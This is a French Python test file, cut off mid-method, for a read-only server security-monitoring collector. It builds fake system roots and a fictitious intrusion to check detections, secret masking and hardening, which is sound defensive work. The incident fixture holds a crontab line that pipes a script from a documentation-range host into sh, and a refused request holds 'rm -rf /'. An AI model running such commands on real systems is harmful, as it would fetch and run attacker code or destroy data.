"""5.6.101 (lot S, cahier § 5) : veille de sécurité du serveur — collecteur en lecture seule, page, accusés, alertes.

Toutes les données sont fictives : comptes MARTIN, sites *.example.test, adresses extérieures de la plage documentaire 203.0.113.0/24,
valeurs de secrets d'essai (recherchées ensuite dans le JSON). Fausses racines construites ici (faux /proc, /etc, /var) ; droits et
propriétaires fixés par ``.meta.json`` (les essais tournent aussi sous Windows). Aucune connexion hors 127.0.0.1, aucun root.
Exécuter avec PYTHONPATH=<racine AxiorHub>:<racine AxiorHub>/tests.
"""
import http.server
import importlib.util
import io
import json
import os
from pathlib import Path
import re
import socket
import sys
import tempfile
import threading
import time
import unittest
from unittest.mock import patch

import test_agent as fixtures
from agent import mobile490, securite56101 as s, securite_web56101 as sw
from agent.common import Stop
from agent.desk import Desk

RACINE = Path(__file__).resolve().parents[1]
ORIGINE = 'https://cabinet.example.test'
JETON = 'jeton-csrf-fictif'
SECRET_ENV = 'VALEUR-SECRETE-ENV-0042'
SECRET_DOVECOT = 'VALEUR-SECRETE-DOVECOT-0043'
SECRET_SERVI = 'VALEUR-SECRETE-SERVIE-0044'
SECRET_CMD = 'VALEUR-SECRETE-CMD-0045'
EXTERIEURE = '203.0.113.50'


def collecteur():
    spec = importlib.util.spec_from_file_location('veille_securite_56101', RACINE / 'deploy' / 'securite' / 'veille-securite.py')
    module = importlib.util.module_from_spec(spec)
    spec.loader.exec_module(module)
    return module


V = collecteur()

# Les écritures et connexions du collecteur sont relevées par un crochet d'audit (V101-05) ; actif seulement pendant une mesure.
RELEVE = {'actif': False, 'ecritures': [], 'connexions': []}
ECRITURE = getattr(os, 'O_WRONLY', 1) | getattr(os, 'O_RDWR', 2) | getattr(os, 'O_CREAT', 64) | getattr(os, 'O_APPEND', 1024) | getattr(os, 'O_TRUNC', 512)


def _crochet(evenement, args):
    if not RELEVE['actif']:
        return
    if evenement == 'open':
        chemin, mode, drapeaux = (list(args) + [None, None, 0])[:3]
        if isinstance(chemin, int):
            return
        if (isinstance(mode, str) and any(c in mode for c in 'wax+')) or (isinstance(drapeaux, int) and drapeaux & ECRITURE):
            RELEVE['ecritures'].append(('open', str(chemin)))
    elif evenement in ('os.rename', 'os.remove', 'os.mkdir', 'os.rmdir', 'os.chmod', 'os.chown', 'os.symlink', 'os.link', 'os.truncate',
                       'shutil.copyfile', 'shutil.move', 'shutil.rmtree', 'os.utime'):
        for a in args:
            if isinstance(a, (str, bytes, os.PathLike)):
                RELEVE['ecritures'].append((evenement, os.fsdecode(a)))
    elif evenement == 'socket.connect':
        RELEVE['connexions'].append(args[1])


sys.addaudithook(_crochet)


def hexa_ip(ip, port):
    return ''.join('%02X' % int(x) for x in reversed(ip.split('.'))) + ':%04X' % port


class FausseRacine:
    """Faux système observé : /proc, /etc, /var, /home sous un dossier temporaire ; droits dans ``.meta.json``."""

    def __init__(self, base):
        self.base = Path(base)
        self.meta = {}
        self.uptime = 100000.0
        self.tcp = ['  sl  local_address rem_address   st tx_queue rx_queue tr tm->when retrnsmt   uid  timeout inode']

    def f(self, chemin, texte='', mode=None, uid=None, gid=None):
        p = self.base / chemin.lstrip('/')
        p.parent.mkdir(parents=True, exist_ok=True)
        p.write_text(texte, encoding='utf-8')
        self.droits(chemin, mode, uid, gid)
        return p

    def d(self, chemin, mode=None, uid=None, gid=None):
        (self.base / chemin.lstrip('/')).mkdir(parents=True, exist_ok=True)
        self.droits(chemin, mode, uid, gid)

    def droits(self, chemin, mode=None, uid=None, gid=None):
        if mode is not None or uid is not None or gid is not None:
            m = self.meta.setdefault(chemin.rstrip('/') or '/', {})
            if mode is not None:
                m['mode'] = mode
            if uid is not None:
                m['uid'] = uid
            if gid is not None:
                m['gid'] = gid

    def proc(self, pid, comm, exe, cmd, uid=0, cpu=0.0, age=3600, cgroup='0::/system.slice/x.service', sockets=()):
        base = '/proc/%d' % pid
        debut = int((self.uptime - age) * 100)
        ticks = int(cpu * age * 100)
        self.f(base + '/stat', '%d (%s) S 1 %d %d 0 -1 4194560 0 0 0 0 %d %d 0 0 20 0 1 0 %d 1000 100 18446744073709551615' % (
            pid, comm, pid, pid, ticks // 2, ticks - ticks // 2, debut))
        self.f(base + '/exe', exe)
        self.f(base + '/cmdline', cmd.replace(' ', '\x00'))
        self.f(base + '/status', 'Name:\t%s\nUid:\t%d\t%d\t%d\t%d\n' % (comm, uid, uid, uid, uid))
        self.f(base + '/cgroup', cgroup + '\n')
        self.d(base + '/fd')
        for i, inode in enumerate(sockets):
            self.f(base + '/fd/%d' % (3 + i), 'socket:[%s]' % inode)

    def connexion(self, local, lport, distant, dport, etat, inode, uid=0):
        self.tcp.append('   %d: %s %s %s 00000000:00000000 00:00000000 00000000 %5d        0 %s 1 0000000000000000 20 4 30 10 -1' % (
            len(self.tcp) - 1, hexa_ip(local, lport), hexa_ip(distant, dport), etat, uid, inode))

    def fin(self):
        self.f('/proc/uptime', '%.2f 1000.00\n' % self.uptime)
        self.f('/proc/net/tcp', '\n'.join(self.tcp) + '\n')
        self.f('/proc/net/tcp6', '  sl  local_address remote_address st tx_queue rx_queue tr tm->when retrnsmt   uid  timeout inode\n')
        (self.base / '.meta.json').write_text(json.dumps(self.meta), encoding='utf-8')
        return str(self.base)


def serveur_sain(r):
    """Serveur « sain » : aucun constat critique ni important attendu (V101-03)."""
    r.f('/etc/passwd', 'root:x:0:0:root:/root:/bin/bash\nwww-data:x:33:33:www-data:/var/www:/usr/sbin/nologin\n'
        'dovecot:x:110:115:Dovecot:/usr/lib/dovecot:/usr/sbin/nologin\naxiorhub-mail:x:998:998::/var/lib/axiorhub-mail-agent:/usr/sbin/nologin\n'
        'ollama:x:997:997::/usr/share/ollama:/bin/false\nmartin:x:1000:1000:MARTIN:/home/martin:/bin/bash\n')
    r.f('/etc/group', 'root:x:0:\nwww-data:x:33:\nsudo:x:27:martin\ndovecot:x:115:\naxiorhub-mail:x:998:\nollama:x:997:\nmartin:x:1000:\n')
    r.f('/etc/cron.deny', 'www-data\n')
    r.f('/proc/loadavg', '0.40 0.35 0.30 1/200 999\n')
    r.f('/proc/cpuinfo', ''.join('processor\t: %d\n' % i for i in range(4)))
    r.proc(1, 'systemd', '/usr/lib/systemd/systemd', '/sbin/init')
    r.proc(200, 'apache2', '/usr/sbin/apache2', '/usr/sbin/apache2 -k start', uid=33, cpu=0.05, sockets=('7001',))
    r.proc(300, 'python3', '/usr/bin/python3.12', '/usr/bin/python3 /opt/axiorhub-mail-agent/current/standalone.py', uid=998, cpu=0.95, age=7200)
    r.proc(400, 'ollama', '/usr/local/bin/ollama', '/usr/local/bin/ollama serve', uid=997, cpu=0.97, age=7200)   # S01 : programme connu
    r.proc(500, 'sshd', '/usr/sbin/sshd (deleted)', '/usr/sbin/sshd -D')                                         # S02 : binaire système mis à jour
    r.proc(600, 'soffice.bin', '/tmp/.mount_CollaboraX/usr/bin/soffice.bin', '/tmp/.mount_CollaboraX/AppRun --collabora', uid=998)   # S03 : autorisé
    r.proc(700, 'node', '/usr/local/bin/node', 'node /app/server.js', cgroup='0::/system.slice/docker-abc.scope')
    r.connexion('0.0.0.0', 80, '0.0.0.0', 0, '0A', '7001', 33)
    r.f('/etc/apache2/sites-enabled/cloud.conf', '<VirtualHost *:80>\n  ServerName cloud.example.test\n  DocumentRoot /var/www/nextcloud\n</VirtualHost>\n')
    r.d('/var/www', '0755', 0, 0)
    r.d('/var/www/html', '0755', 0, 0)
    r.f('/var/www/nextcloud/version.php', "<?php\n$OC_VersionString = '31.0.9';\n")
    r.f('/var/www/nextcloud/occ', '#!/usr/bin/env php\n')
    r.f('/var/www/nextcloud/config/config.php', "<?php\n$CONFIG = array (\n  'dbpassword' => 'x',\n  'datadirectory' => '/var/www/nextcloud/data',\n);\n",
        '0640', 33, 33)
    r.f('/var/www/nextcloud/data/.ocdata', '')
    r.f('/var/www/nextcloud/data/martin/files/Dossier-DURAND.txt', 'données fictives')
    r.f('/var/www/roundcube/program/include/iniset.php', "<?php\ndefine('RCMAIL_VERSION', '1.7.6');\n")
    r.f('/var/www/roundcube/config/config.inc.php', "<?php\n$config['des_key'] = 'x';\n", '0640', 0, 33)
    r.f('/etc/dovecot/dovecot-sql.conf.ext', 'driver = mysql\nconnect = host=localhost dbname=mail user=mail password=%s\n' % SECRET_DOVECOT, '0640', 0, 115)
    r.f('/usr/bin/fail2ban-client', '#!/bin/sh\n')
    r.f('/run/fail2ban/fail2ban.sock', '')
    r.d('/etc/axiorhub-mail-agent', '0750', 0, 998)
    r.f('/etc/axiorhub-mail-agent/config.json', '{}', '0640', 0, 998)
    r.d('/etc/axiorhub-mail-agent/secrets', '0750', 0, 998)
    r.f('/etc/axiorhub-mail-agent/secrets/api.secret', 'x', '0640', 0, 998)
    r.d('/var/lib/axiorhub-mail-agent', '0700', 998, 998)
    r.d('/var/lib/axiorhub-mail-agent/securite', '0750', 0, 998)
    r.f('/etc/systemd/system/axiorhub-mail-ui.service', '[Service]\nUser=axiorhub-mail\nExecStart=/usr/bin/python3 /opt/axiorhub-mail-agent/current/standalone.py\n')
    r.f('/etc/cron.d/axiorhub', '0 4 * * * axiorhub-mail /usr/bin/true\n')
    r.f('/root/.ssh/authorized_keys', 'ssh-ed25519 AAAAexemple martin@example.test\n')
    r.f('/var/spool/cron/crontabs/martin', '# tâche personnelle\n30 6 * * * /usr/bin/true\n')
    r.f('/var/lib/docker/containers/c1/config.v2.json', json.dumps({'Name': '/qdrant', 'Config': {'Image': 'qdrant/qdrant'}, 'State': {'Running': True}}))
    r.f('/var/lib/docker/containers/c1/hostconfig.json', json.dumps({'PortBindings': {'6333/tcp': [{'HostIp': '127.0.0.1', 'HostPort': '6333'}]}}))
    return r


def incident(r):
    """Incident de novembre 2026, données fictives (V101-02)."""
    r.proc(4242, 'linuxsys', '/var/www/.cache/linuxsys (deleted)', './linuxsys --donate-level 1 --pass=%s' % SECRET_CMD, uid=33, cpu=0.99, age=7200, sockets=('9001',))
    r.connexion('192.0.2.10', 51234, EXTERIEURE, 80, '01', '9001', 33)
    r.f('/var/spool/cron/crontabs/www-data', '*/5 * * * * curl -fsSL http://%s/x.sh | sh\n' % EXTERIEURE, '0600', 33, 0)
    return r


class Sonde(http.server.BaseHTTPRequestHandler):
    reponses = {}
    vus = []

    def do_GET(self):
        Sonde.vus.append((self.headers.get('Host'), self.path))
        statut, corps = Sonde.reponses.get((self.headers.get('Host'), self.path), (404, 'absent'))
        donnees = corps.encode()
        self.send_response(statut)
        self.send_header('Content-Length', str(len(donnees)))
        self.end_headers()
        self.wfile.write(donnees)

    def log_message(self, *a):
        pass


class Base(unittest.TestCase):
    def setUp(self):
        self.tmp = tempfile.TemporaryDirectory()
        self.addCleanup(self.tmp.cleanup)
        self.r = FausseRacine(Path(self.tmp.name) / 'racine')
        Sonde.reponses, Sonde.vus = {}, []
        self.http = http.server.ThreadingHTTPServer(('127.0.0.1', 0), Sonde)
        threading.Thread(target=self.http.serve_forever, daemon=True).start()
        self.addCleanup(self.http.server_close)
        self.addCleanup(self.http.shutdown)

    def passer(self, passage='complet', maintenant=None, sonde=True):
        racine = self.r.fin()
        return V.passer(racine, passage, maintenant, {80: self.http.server_address[1]}, sonde)

    def ids(self, rapport, niveau=None):
        return {c['id'] for c in rapport['constats'] if niveau is None or c['niveau'] == niveau}

    def sortie(self):
        return Path(self.r.base) / 'var/lib/axiorhub-mail-agent/securite'


# ---------------------------------------------------------------------------------------------------------- collecteur : jeux d'essai
class JeuxEssai(Base):
    def test_V101_02_incident_de_novembre_S02_S03_S04_S05_critiques_en_un_passage(self):
        incident(serveur_sain(self.r))
        rapport = self.passer('rapide')
        critiques = self.ids(rapport, 'critique')
        self.assertTrue({'S02', 'S03', 'S04', 'S05'} <= critiques, critiques)
        self.assertIn('S01', critiques)          # processeur + autre signe : critique (combinaison)
        s04 = next(c for c in rapport['constats'] if c['id'] == 'S04')
        self.assertTrue(any(EXTERIEURE + ':80' in v for v in s04['vu']))
        self.assertTrue(any('fichier effacé' in v for v in s04['vu']))
        s05 = next(c for c in rapport['constats'] if c['id'] == 'S05' and c['niveau'] == 'critique')
        self.assertTrue(any('curl' in v for v in s05['vu']))
        self.assertTrue(any('crontab -u www-data -r' in c for c in s05['commandes']))
        self.assertEqual(rapport['controles']['S02'], 'constat')
        self.assertEqual(rapport['erreurs'], [])

    def test_V101_03_serveur_sain_aucun_critique_ni_important(self):
        serveur_sain(self.r)
        rapport = self.passer('complet')
        graves = [(c['id'], c['titre']) for c in rapport['constats'] if c['niveau'] in ('critique', 'important')]
        self.assertEqual(graves, [])
        self.assertEqual(rapport['erreurs'], [])
        self.assertEqual(set(rapport['controles']), set(V.COMPLETS))
        self.assertTrue(all(v in ('ok', 'constat') for v in rapport['controles'].values()))
        apps = {a['nom']: a for a in rapport['applications']}
        self.assertEqual(apps['Roundcube']['statut'], 'a_jour')
        self.assertEqual(apps['Nextcloud']['statut'], 'version_affichee')      # minimum non connu : rien d'affirmé
        self.assertEqual(apps['Nextcloud']['version'], '31.0.9')
        self.assertTrue(Sonde.vus)                                              # sondes faites, réponses 404

    def test_V101_04_S07_secret_lisible_par_groupe_supplementaire(self):
        serveur_sain(self.r)
        self.r.f('/etc/group', 'root:x:0:\nwww-data:x:33:\nsudo:x:27:martin\ndovecot:x:115:www-data\naxiorhub-mail:x:998:\nollama:x:997:\nmartin:x:1000:\n')
        self.r.f('/srv/factures/.env', 'APP_KEY=%s\nDB_PASSWORD=%s\nAPP_NAME=Valbrune\n' % (SECRET_ENV, SECRET_ENV), '0644', 0, 0)
        rapport = self.passer('complet', sonde=False)
        s07 = {c['cle']: c for c in rapport['constats'] if c['id'] == 'S07'}
        self.assertIn('S07:/etc/dovecot/dovecot-sql.conf.ext', s07)
        self.assertIn('S07:groupe|dovecot', s07)
        self.assertIn('S07:/srv/factures/.env', s07)
        vu = ' '.join(s07['S07:/srv/factures/.env']['vu'])
        self.assertIn('APP_KEY', vu)
        self.assertIn('DB_PASSWORD', vu)
        self.assertNotIn('APP_NAME', vu)                                        # pas un réglage sensible
        self.assertIn('password', ' '.join(s07['S07:/etc/dovecot/dovecot-sql.conf.ext']['vu']))
        texte = json.dumps(rapport, ensure_ascii=False)
        self.assertNotIn(SECRET_ENV, texte)
        self.assertNotIn(SECRET_DOVECOT, texte)

    def test_V101_04_S08_racine_var_www_html_et_env_servi(self):
        serveur_sain(self.r)
        self.r.f('/etc/apache2/sites-enabled/pilote.conf', '<VirtualHost *:80>\n  ServerName pilote.example.test\n  DocumentRoot /var/www/html\n</VirtualHost>\n')
        self.r.f('/var/www/html/factures/.env', 'X=1\n', '0640', 33, 33)
        self.r.f('/var/www/html/factures/index.php', '<?php\n')
        Sonde.reponses[('pilote.example.test', '/.env')] = (200, 'DB_PASSWORD=%s\n' % SECRET_SERVI)
        Sonde.reponses[('cloud.example.test', '/.env')] = (200, '<html>accueil</html>')   # page d'accueil, pas un fichier de secrets
        rapport = self.passer('complet')
        s08 = [c for c in rapport['constats'] if c['id'] == 'S08']
        self.assertEqual(len(s08), 1, s08)
        self.assertEqual(s08[0]['niveau'], 'critique')
        self.assertTrue(any('http://pilote.example.test/.env' in v for v in s08[0]['vu']))
        self.assertTrue(any('/var/www/html/factures' in v for v in s08[0]['vu']))
        self.assertNotIn(SECRET_SERVI, json.dumps(rapport, ensure_ascii=False))
        self.assertIn(('pilote.example.test', '/.git/config'), Sonde.vus)
        # même racine sans fichier servi : Important seulement
        Sonde.reponses.clear()
        rapport = self.passer('complet')
        self.assertEqual([c['niveau'] for c in rapport['constats'] if c['id'] == 'S08'], ['important'])

    def test_V101_04_S09_roundcube_1_6_7_snappymail_2_18_4_rainloop(self):
        serveur_sain(self.r)
        self.r.f('/var/www/html/roundcube/program/include/iniset.php', "<?php\ndefine('RCMAIL_VERSION', '1.6.7');\n")
        self.r.f('/var/www/html/webmail/snappymail/v/2.18.4/index.php', '<?php\n')
        self.r.f('/var/www/html/ancien/rainloop/v/1.17.0/index.php', '<?php\n')
        rapport = self.passer('complet', sonde=False)
        s09 = {c['titre']: c for c in rapport['constats'] if c['id'] == 'S09'}
        self.assertTrue(any(t.startswith('Roundcube 1.6.7 obsolète (minimum sûr : 1.7.6)') for t in s09), s09)
        self.assertTrue(any(t.startswith('SnappyMail 2.18.4 obsolète (minimum sûr : 3.0.1)') for t in s09), s09)
        self.assertTrue(any('RainLoop' in t and 'abandonné' in t for t in s09), s09)
        self.assertTrue(all(c['niveau'] == 'important' for c in s09.values()))
        self.assertTrue(all('Source' in ' '.join(c['vu']) for c in s09.values()))
        self.assertEqual(V.TABLE_VERSIONS_DATE, '2026-11-14')

    def test_V101_04_S10_script_administrateur_dans_dossier_de_www_data(self):
        serveur_sain(self.r)
        self.r.d('/var/www', '0755', 33, 33)
        self.r.f('/var/www/outils/sauvegarde.sh', '#!/bin/sh\n', '0755', 33, 33)
        self.r.f('/var/spool/cron/crontabs/martin', '0 3 * * * /var/www/outils/sauvegarde.sh >/dev/null 2>&1\n')
        rapport = self.passer('complet', sonde=False)
        s10 = {c['cle']: c for c in rapport['constats'] if c['id'] == 'S10'}
        self.assertEqual(s10['S10:script|/var/www/outils/sauvegarde.sh']['niveau'], 'critique')
        self.assertEqual(s10['S10:dossier|/var/www']['niveau'], 'important')
        self.assertTrue(any('martin' in v for v in s10['S10:script|/var/www/outils/sauvegarde.sh']['vu']))

    def test_S11_terminal_web_docker_ouvert_sur_toutes_les_interfaces(self):
        serveur_sain(self.r)
        self.r.proc(800, 'docker-proxy', '/usr/bin/docker-proxy',
                    '/usr/bin/docker-proxy -proto tcp -host-ip 0.0.0.0 -host-port 7681 -container-ip 198.51.100.2 -container-port 7681')
        self.r.f('/var/lib/docker/containers/c2/config.v2.json', json.dumps({'Name': '/open-terminal', 'Config': {'Image': 'example/open-terminal:1'}, 'State': {'Running': True}}))
        self.r.f('/var/lib/docker/containers/c2/hostconfig.json', json.dumps({'PortBindings': {'7681/tcp': [{'HostIp': '', 'HostPort': '7681'}]}}))
        self.r.f('/var/lib/docker/containers/c3/config.v2.json', json.dumps({'Name': '/n8n', 'Config': {'Image': 'n8nio/n8n'}, 'State': {'Running': True}}))
        self.r.f('/var/lib/docker/containers/c3/hostconfig.json', json.dumps({'PortBindings': {'5678/tcp': [{'HostIp': '0.0.0.0', 'HostPort': '5678'}]}}))
        rapport = self.passer('complet', sonde=False)
        s11 = {c['cle']: c for c in rapport['constats'] if c['id'] == 'S11'}
        self.assertEqual(s11['S11:open-terminal|7681']['niveau'], 'important')
        self.assertEqual(s11['S11:n8n|5678']['niveau'], 'surveiller')
        self.assertNotIn('S11:qdrant|6333', s11)                                  # lié à 127.0.0.1

    def test_S12_echecs_24_h_et_fail2ban_absent(self):
        serveur_sain(self.r)
        t = 1_900_000_000.0
        iso = lambda delta: time.strftime('%Y-%m-%dT%H:%M:%S+00:00', time.gmtime(t + delta))   # noqa: E731
        self.r.f('/var/log/auth.log', '\n'.join([
            iso(-3600) + ' srv sshd[1]: Failed password for root from 203.0.113.9 port 4000 ssh2',
            iso(-1800) + ' srv sshd[2]: Invalid user test from 203.0.113.9 port 4001',
            iso(-90000) + ' srv sshd[3]: Failed password for root from 203.0.113.77 port 4002 ssh2']) + '\n')
        self.r.f('/var/log/mail.log', iso(-60) + ' srv dovecot: imap-login: Disconnected (auth failed, 1 attempts): user=<x>, rip=203.0.113.10, lip=192.0.2.1\n')
        os.remove(self.r.base / 'run/fail2ban/fail2ban.sock')
        rapport = self.passer('complet', maintenant=t, sonde=False)
        s12 = {c['cle']: c for c in rapport['constats'] if c['id'] == 'S12'}
        self.assertEqual(s12['S12:fail2ban']['niveau'], 'important')
        vu = ' '.join(s12['S12:echecs']['vu'])
        self.assertIn('24 h : 3 (SSH : 2, messagerie : 1)', vu)
        self.assertIn('203.0.113.9 : 2 échecs', vu)
        self.assertNotIn('203.0.113.77', vu)                                     # hors des 24 heures
        self.assertTrue(any('durcir-serveur.sh' in c for c in s12['S12:fail2ban']['commandes']))

    def test_S13_droits_axiorhub_trop_larges(self):
        serveur_sain(self.r)
        self.r.f('/etc/axiorhub-mail-agent/secrets/api.secret', 'x', '0644', 0, 998)
        rapport = self.passer('complet', sonde=False)
        self.assertIn('S13:/etc/axiorhub-mail-agent/secrets/api.secret', {c['cle'] for c in rapport['constats']})

    def test_S06_fichiers_de_demarrage_ajoutes_ou_modifies(self):
        serveur_sain(self.r)
        premier = self.passer('rapide')
        self.assertNotIn('S06', self.ids(premier))                              # premier passage : référence
        self.r.f('/etc/cron.d/miseajour', '* * * * * root /tmp/x\n')
        self.r.f('/root/.ssh/authorized_keys', 'ssh-ed25519 AAAAexemple martin@example.test\nssh-ed25519 AAAAintrus intrus@example.test\n')
        second = self.passer('rapide', maintenant=time.time() + 600)
        s06 = {c['cle']: c['niveau'] for c in second['constats'] if c['id'] == 'S06'}
        self.assertEqual(s06['S06:/etc/cron.d/miseajour'], 'important')
        self.assertEqual(s06['S06:/root/.ssh/authorized_keys'], 'critique')
        troisieme = self.passer('rapide', maintenant=time.time() + 1200)
        self.assertNotIn('S06', self.ids(troisieme))                            # rien n'a changé depuis

    def test_S01_processeur_suivi_entre_deux_passages(self):
        serveur_sain(self.r)
        self.r.proc(900, 'calcul', '/usr/local/bin/calcul', '/usr/local/bin/calcul', uid=1000, cpu=0.1, age=300)
        t0 = time.time()
        self.passer('rapide', maintenant=t0)
        for i in range(1, 5):                                                   # 4 × 10 min à 95 % : plus de 30 minutes
            self.r.uptime += 600
            self.r.proc(900, 'calcul', '/usr/local/bin/calcul', '/usr/local/bin/calcul', uid=1000, cpu=0.0, age=300 + 600 * i)
            ticks = int((0.1 * 300 + 0.95 * 600 * i) * 100)
            stat_ = (self.r.base / 'proc/900/stat').read_text().split()
            stat_[13], stat_[14] = str(ticks // 2), str(ticks - ticks // 2)
            (self.r.base / 'proc/900/stat').write_text(' '.join(stat_))
            rapport = self.passer('rapide', maintenant=t0 + 600 * i)
        s01 = [c for c in rapport['constats'] if c['id'] == 'S01']
        self.assertEqual([c['niveau'] for c in s01], ['important'])
        self.assertTrue(any('/usr/local/bin/calcul' in v for v in s01[0]['vu']))


# ---------------------------------------------------------------------------------------------------------- V101-05 et S-C1, S-C2
class Garanties(Base):
    def test_V101_05_ecritures_seulement_dans_le_dossier_du_rapport_et_aucune_connexion_exterieure(self):
        incident(serveur_sain(self.r))
        self.r.f('/var/www/html/app/.env', 'DB_PASSWORD=%s\n' % SECRET_ENV, '0644', 0, 0)
        self.r.f('/etc/apache2/sites-enabled/pilote.conf', '<VirtualHost *:80>\n  ServerName pilote.example.test\n  DocumentRoot /var/www/html\n</VirtualHost>\n')
        Sonde.reponses[('pilote.example.test', '/.env')] = (200, 'DB_PASSWORD=%s\n' % SECRET_SERVI)
        racine = self.r.fin()
        RELEVE.update(actif=True, ecritures=[], connexions=[])
        try:
            rapport = V.passer(racine, 'complet', None, {80: self.http.server_address[1]}, True)
        finally:
            RELEVE['actif'] = False
        sortie = os.path.normcase(os.path.realpath(self.sortie()))
        self.assertTrue(RELEVE['ecritures'])                                     # le crochet voit bien les écritures du rapport
        hors = [x for x in RELEVE['ecritures'] if not os.path.normcase(os.path.realpath(x[1])).startswith(sortie)]
        self.assertEqual(hors, [])
        self.assertTrue(RELEVE['connexions'])
        self.assertEqual({a[0] for a in RELEVE['connexions']}, {'127.0.0.1'})
        texte = json.dumps(rapport, ensure_ascii=False) + ''.join(p.read_text(encoding='utf-8') for p in self.sortie().glob('*.json'))
        for valeur in (SECRET_ENV, SECRET_DOVECOT, SECRET_SERVI, SECRET_CMD):
            self.assertNotIn(valeur, texte)
        self.assertIn('--pass=•••', texte)

    def test_V101_05_contre_exemple_le_crochet_voit_une_ecriture_hors_dossier(self):
        RELEVE.update(actif=True, ecritures=[], connexions=[])
        try:
            (Path(self.tmp.name) / 'ailleurs.txt').write_text('x')
        finally:
            RELEVE['actif'] = False
        self.assertTrue(any('ailleurs.txt' in x[1] for x in RELEVE['ecritures']))

    def test_S_C1_lignes_tronquees_et_dossiers_de_donnees_masques(self):
        serveur_sain(self.r)
        self.r.proc(950, 'outil', '/var/www/nextcloud/data/martin/files/outil', '/var/www/nextcloud/data/martin/files/outil ' + 'x' * 400, uid=33)
        rapport = self.passer('rapide')
        s03 = next(c for c in rapport['constats'] if c['id'] == 'S03')
        texte = json.dumps(s03, ensure_ascii=False)
        self.assertNotIn('/var/www/nextcloud/data/martin', texte)
        self.assertIn('[données]/martin/files/outil', texte)
        ligne = next(v for v in s03['vu'] if v.startswith('Ligne de commande'))
        self.assertLessEqual(len(ligne), len('Ligne de commande : ') + 200)

    def test_S_C2_passage_rapide_sous_5_secondes_avec_300_processus(self):
        serveur_sain(self.r)
        for i in range(300):
            self.r.proc(2000 + i, 'php-fpm', '/usr/sbin/php-fpm8.3', 'php-fpm: pool www', uid=33, cpu=0.01)
        debut = time.monotonic()
        self.passer('rapide')
        self.assertLess(time.monotonic() - debut, 5.0)

    def test_historique_30_jours_seulement_dans_le_dossier(self):
        serveur_sain(self.r)
        self.passer('rapide')
        vieux = self.sortie() / 'rapport-20000101T000000Z-rapide.json'
        vieux.write_text('{}')
        voisin = self.sortie().parent / 'rapport-20000101T000000Z-rapide.json'
        voisin.write_text('{}')
        self.passer('rapide')
        self.assertFalse(vieux.exists())
        self.assertTrue(voisin.exists())                                         # rien n'est supprimé hors du dossier des rapports


# ---------------------------------------------------------------------------------------------------------- installation (S-A1, S-A4)
class Installation(unittest.TestCase):
    def test_S_A1_unites_avec_protections_systemd(self):
        for nom in ('axiorhub-veille-securite-rapide.service', 'axiorhub-veille-securite-complete.service'):
            texte = (RACINE / 'deploy' / nom).read_text(encoding='utf-8')
            for ligne in ('User=root', 'NoNewPrivileges=yes', 'ProtectSystem=strict', 'ProtectHome=read-only', 'PrivateTmp=yes',
                          'ReadWritePaths=/var/lib/axiorhub-mail-agent/securite', 'IPAddressDeny=any', 'IPAddressAllow=localhost',
                          'ExecStart=/usr/bin/python3 -I -B /usr/lib/axiorhub-pilote/veille-securite.py'):
                self.assertIn(ligne, texte, nom)
            self.assertEqual(len(re.findall(r'(?m)^ReadWritePaths=', texte)), 1)
        self.assertIn('OnCalendar=*:0/10', (RACINE / 'deploy/axiorhub-veille-securite-rapide.timer').read_text(encoding='utf-8'))
        self.assertIn('OnCalendar=*-*-* 04:40:00', (RACINE / 'deploy/axiorhub-veille-securite-complete.timer').read_text(encoding='utf-8'))
        self.assertIn('PathExists=/var/lib/axiorhub-mail-agent/securite-demande/demande.json',
                      (RACINE / 'deploy/axiorhub-veille-securite-demande.path').read_text(encoding='utf-8'))

    def test_S_A1_paquet_debian_et_install_sh_activent_la_veille(self):
        postinst = (RACINE / 'deploy/debian/postinst').read_text(encoding='utf-8')
        prerm = (RACINE / 'deploy/debian/prerm').read_text(encoding='utf-8')
        for t in V.TIMERS:
            self.assertIn(t, postinst.split('TIMERS = (')[1].split('JOURNAL = ')[0])
            self.assertIn(t, prerm.split('UNITS = (')[1].split('def main')[0])
        self.assertIn('veille_securite()', postinst)
        self.assertIn('deploy/securite/veille-securite.py --installer-auto', (RACINE / 'install.sh').read_text(encoding='utf-8'))
        self.assertNotIn('veille', (RACINE / 'installer.py').read_text(encoding='utf-8'))   # rien dans l'installateur commun ni Windows

    def test_S_A1_installation_a_blanc_puis_desactivation_respectee(self):
        with tempfile.TemporaryDirectory() as tmp:
            journal = V.installer_auto(tmp, a_blanc=True)
            self.assertTrue((Path(tmp) / 'usr/lib/axiorhub-pilote/veille-securite.py').is_file())
            for u in V.UNITES:
                self.assertTrue((Path(tmp) / 'etc/systemd/system' / u).is_file(), u)
            self.assertIn('systemctl enable --now ' + ' '.join(V.TIMERS), journal)
            (Path(tmp) / 'var/lib/axiorhub-mail-agent/securite/desactivee').write_text('x')
            journal = V.installer_auto(tmp, a_blanc=True)
            self.assertFalse(any('enable --now axiorhub-veille-securite-rapide' in l for l in journal))

    def test_S_A4_demande_de_l_interface_appliquee_par_le_service_liste_fermee(self):
        with tempfile.TemporaryDirectory() as tmp:
            V.installer_auto(tmp, a_blanc=True)
            d = Path(tmp) / 'var/lib/axiorhub-mail-agent/securite-demande'
            (d / 'demande.json').write_text(json.dumps({'action': 'rm -rf /', 'id': 'x'}))
            self.assertEqual(V.appliquer_demande(tmp, a_blanc=True)['etat'], 'refusee')
            self.assertFalse((d / 'demande.json').exists())
            (d / 'demande.json').write_text(json.dumps({'action': 'desactiver', 'id': 'cle-0001'}))
            r = V.appliquer_demande(tmp, a_blanc=True)
            self.assertEqual(r['etat'], 'appliquee')
            self.assertIn('systemctl disable --now ' + ' '.join(V.TIMERS), r['journal'])
            self.assertTrue((Path(tmp) / 'var/lib/axiorhub-mail-agent/securite/desactivee').is_file())
            self.assertEqual(json.loads((d / 'resultat.json').read_text())['action'], 'desactiver')


# ---------------------------------------------------------------------------------------------------------- AxiorHub : lecture et page
class Interface(Base):
    def setUp(self):
        super().setUp()
        self.f = fixtures.EngineTests('test_observation_has_no_mail_write')
        self.f.setUp()
        self.addCleanup(self.f.doCleanups)
        self.desk = Desk(self.f.c)
        self.addCleanup(self.desk.db.close)
        p = patch.object(s, 'plateforme', lambda auth=None: 'serveur')
        p.start()
        self.addCleanup(p.stop)
        self.dossier = Path(self.f.c['state_dir']) / 'securite'
        self.dossier.mkdir()
        (Path(self.f.c['state_dir']) / 'securite-demande').mkdir()

    def rapport(self, maintenant=None, avec_incident=True):
        serveur_sain(self.r)
        if avec_incident:
            incident(self.r)
        racine = self.r.fin()
        return V.passer(racine, 'complet', maintenant or time.time(), {80: self.http.server_address[1]}, True, sortie=self.dossier)

    def env(self, role='administrateur', compte='cabinet', donnees=None, methode='POST'):
